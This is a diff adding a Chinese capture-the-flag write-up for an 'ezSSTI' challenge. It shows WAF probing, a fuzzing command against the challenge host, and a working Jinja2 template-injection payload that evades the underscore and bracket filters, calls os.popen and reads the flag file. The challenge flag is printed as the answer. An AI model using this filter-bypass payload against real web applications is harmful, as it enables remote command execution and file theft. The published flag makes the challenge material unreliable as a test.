@@ -167,6 +167,108 @@ ISCTF{b80f372d-89e6-44e2-9174-682a42c70ed1}
 
 
 
+### ezSSTI
+
+#### 题目信息
+
+> ## ezSSTI256 pts
+>
+> 题目难度：**简单**
+>
+> 题目描述：python ssti注入
+>
+> 出题人：fpclose
+>
+> 学校：大理大学
+
+#### 解题过程
+
+##### 查看题目
+
+```shell
+{{1+1}}
+```
+
+```shell
+You entered: 2
+```
+
+```shell
+{{().__class__.__base__.__subclasses__()}}
+```
+
+```shell
+You entered: waf!
+```
+
+**分析**
+
+- **存在SSTI漏洞注入**
+- **存在Waf黑名单拦截**
+
+##### 模糊测试
+
+利用自研工具WebFuzz(https://github.com/BProbie/WebFuzz)模糊测试一下Waf
+
+```shell
+WebFuzz -u http://challenge.imxbt.cn:30820/ -dt {'user_input':'{{().__class__.__bases__[0].__subclasses__()}}'} -waf waf! -tr 100
+```
+
+```shell
+Thanks For Using WebFuzz-v1.1.0 (https://github.com/BProbie/WebFuzz)
+Uri: http://challenge.imxbt.cn:30820/
+Type: POST
+Data: {'user_input': '{{().__class__.__bases__[0].__subclasses__()}}'}
+Waf: ['waf!']
+Delay: 0
+Thread: 100
+The Script Start At The Time Of 2026-05-12 17:16:36
+
+[#########################] 903/903 (The Script End At The Time Of 2026-05-12 17:17:05)
+
+The Result of WebFuzz: ['_', '[']
+```
+
+**分析**
+
+- 我们可以用**【("%c"%95)*2】**来替代**【__】**
+- 我们可以用**【|attr("getitem")(0)】**来替代**【[0]】**
+- 我们用**【{% print %}】**来执行
+
+##### 编写payload
+
+```shell
+{% print (cycler.next|attr(("%c"%95)*2+'globals'+("%c"%95)*2)|attr(("%c"%95)*2+'getitem'+("%c"%95)*2) (("%c"%95)*2+'builtins'+("%c"%95)*2)|attr(("%c"%95)*2+'getitem'+("%c"%95)*2)(("%c"%95)*2+'import'+ ("%c"%95)*2))('os').popen('cat /f*').read() %}
+```
+
+##### 发起攻击
+
+```shell
+{% print (cycler.next|attr(("%c"%95)*2+'globals'+("%c"%95)*2)|attr(("%c"%95)*2+'getitem'+("%c"%95)*2) (("%c"%95)*2+'builtins'+("%c"%95)*2)|attr(("%c"%95)*2+'getitem'+("%c"%95)*2)(("%c"%95)*2+'import'+ ("%c"%95)*2))('os').popen('cat /f*').read() %}
+```
+
+```shell
+You entered: ISCTF{d70c7690-e492-47a1-a964-9f98f77ec477}
+```
+
+#### 题目答案
+
+##### 核心payload
+
+```shell
+{% print (cycler.next|attr(("%c"%95)*2+'globals'+("%c"%95)*2)|attr(("%c"%95)*2+'getitem'+("%c"%95)*2) (("%c"%95)*2+'builtins'+("%c"%95)*2)|attr(("%c"%95)*2+'getitem'+("%c"%95)*2)(("%c"%95)*2+'import'+ ("%c"%95)*2))('os').popen('cat /f*').read() %}
+```
+
+##### 获得答案
+
+```shell
+ISCTF{d70c7690-e492-47a1-a964-9f98f77ec477}
+```
+
+
+
+
+
 
 
 
